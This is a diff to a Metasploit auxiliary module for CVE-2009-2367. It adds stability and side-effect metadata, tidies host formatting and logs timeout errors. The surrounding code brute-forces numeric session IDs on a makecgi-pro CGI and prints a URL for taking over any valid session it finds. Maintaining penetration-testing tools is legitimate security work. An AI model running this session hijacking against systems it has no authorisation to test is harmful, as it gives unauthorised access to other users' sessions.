@@ -19,7 +19,12 @@ class MetasploitModule < Msf::Auxiliary
         [ 'CVE', '2009-2367' ],
       ],
       'Author' => [ 'aushack' ],
-      'License' => MSF_LICENSE
+      'License' => MSF_LICENSE,
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [IOC_IN_LOGS],
+        'Reliability' => []
+      }
     )
 
     register_options(
@@ -38,15 +43,16 @@ class MetasploitModule < Msf::Auxiliary
         'method' => 'GET'
       }, 25)
 
-      if (res && res.to_s =~ (/Log out/))
+      if res && res.to_s =~ /Log out/
         print_status("Found valid session ID number #{x}!")
-        print_status("Browse to http://#{rhost}:#{rport}/cgi-bin/makecgi-pro?job=show_home&session_id=#{x}")
+        print_status("Browse to http://#{Rex::Socket.to_authority(rhost, rport)}/cgi-bin/makecgi-pro?job=show_home&session_id=#{x}")
         break
       end
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-      print_error("Unable to connect to #{rhost}:#{rport}")
+      print_error("Unable to connect to #{Rex::Socket.to_authority(rhost, rport)}")
       break
-    rescue ::Timeout::Error, ::Errno::EPIPE
+    rescue ::Timeout::Error, ::Errno::EPIPE => e
+      vprint_error(e.message)
     end
   end
 end
